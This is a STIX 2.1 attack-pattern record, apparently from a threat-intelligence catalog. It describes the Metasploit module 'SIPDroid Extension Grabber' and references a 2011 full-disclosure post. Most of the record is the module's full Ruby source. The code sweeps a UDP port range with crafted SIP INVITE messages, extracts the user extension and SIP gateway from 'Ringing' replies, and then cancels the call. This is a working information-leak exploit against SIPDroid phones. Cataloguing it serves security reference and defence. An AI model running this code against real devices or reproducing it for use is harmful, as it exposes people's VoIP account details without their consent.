{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cfad1207-6ee0-4c2b-8e6c-b438544ce65c",
    "created": "2024-08-14T16:31:13.641926Z",
    "modified": "2024-08-14T16:31:13.641929Z",
    "name": "SIPDroid Extension Grabber",
    "description": " This module exploits a leak of extension/SIP Gateway on SIPDroid 1.6.1 beta, 2.0.1 beta, 2.2 beta (tested in Android 2.1 and 2.2 - official Motorola release) (other versions may be affected). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/sip/sipdroid_ext_enum.rb",
            "external_id": "sipdroid_ext_enum.rb"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2011/May/83"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'SIPDroid Extension Grabber',\n      'Description'    => %q{\n        This module exploits a leak of extension/SIP Gateway\n      on SIPDroid 1.6.1 beta, 2.0.1 beta, 2.2 beta (tested in Android 2.1 and 2.2 - official Motorola release)\n      (other versions may be affected).\n        },\n      'Author'         => 'Anibal Aguiar <anibal.aguiar[at]gmail.com>',\n      'References'     =>\n        [\n          ['BID', '47710'],\n          ['URL', 'https://seclists.org/fulldisclosure/2011/May/83'],\n        ]\n      ))\n\n    register_options(\n      [\n        OptInt.new('STRTPORT',  [true, 'The start probe port', 59150]),\n        OptInt.new('FNLPORT',   [true, 'The final probe port', 59159]),\n        OptInt.new('RPORT',     [false, 'Remote port to probe', nil]),\n      ])\n  end\n\n  def create_probe(ip, meth, branch, tag, callid)\n    suser = Rex::Text.rand_text_alphanumeric(rand(8)+1)\n    shost = Rex::Socket.source_address(ip)\n    src\t  = \"#{shost}:5060\"\n\n    if branch.nil?\n      branch = \"z9hG4bK#{\"%.8x\" % rand(0x100000000)}\"\n    end\n\n    if tag.nil?\n      tag = \"as#{rand(0x100000)}\"\n    end\n\n    if callid.nil?\n      callid = rand(0x100000000)\n    end\n\n    @branch = branch\n    @tag = tag\n    @callid = callid\n\n    data  = \"#{meth} sip:#{ip} SIP/2.0\\r\\n\"\n    data << \"Via: SIP/2.0/UDP #{src};branch=#{branch};rport\\r\\n\"\n    data << \"Content-Length: 0\\r\\n\"\n    data << \"From: \\\"SIPDROID\\\";tag=#{tag}\\r\\n\"\n    data << \"Accept: application/sdp\\r\\n\"\n    data << \"User-Agent: SIPDROID\\r\\n\"\n    data << \"To: sip:#{ip}\\r\\n\"\n    data << \"Contact: \\r\\n\"\n    data << \"CSeq: 1 #{meth}\\r\\n\"\n    data << \"Call-ID: #{callid}@#{shost}\\r\\n\"\n    data << \"Max-Forwards: 70\\r\\n\"\n\n    return data\n  end\n\n  def run()\n    strtport = datastore['STRTPORT']\n    fnlport = datastore['FNLPORT']\n\n    print_status(\"Trying target #{datastore['RHOST']}...\")\n    while strtport <= fnlport\n      rcv = 'nothing'\n      begin\n        datastore['RPORT'] = strtport\n\n        connect_udp\n        data = create_probe(datastore['RHOST'], 'INVITE', nil, nil, nil)\n        udp_sock.put(data)\n\n        while not rcv.nil?\n          msg = udp_sock.recvfrom(1024, 4)\n          if not msg[0].eql?(\"\")\n            if msg[0].include?(\"SIP/2.0 180 Ringing\")\n              origin = /o=\\w+\\@[\\w+\\.]+/.match(msg[0])\n\n              if not origin.nil?\n                print_good(/\\w+\\@[\\w+\\.]+/.match(origin.to_s).to_s)\n              else\n                print_status(\"Ringing message received but no user/gateway sent...\")\n              end\n\n              data = create_probe(datastore['RHOST'], 'CANCEL', @branch, @tag, @callid)\n              udp_sock.put(data)\n              strtport = fnlport + 1\n              rcv = nil\n            end\n          else\n            break\n          end\n        end\n      rescue ::Exception => e\n        disconnect_udp\n        if strtport == fnlport\n          print_status(\"Tested all ports got no response, try a bigger port range.\")\n        end\n      ensure\n        if strtport == fnlport and not rcv.nil?\n          print_status(\"Tested all ports got no response, try a bigger port range.\")\n        end\n        disconnect_udp\n        strtport += 1\n      end\n    end\n  end\nend\n"
}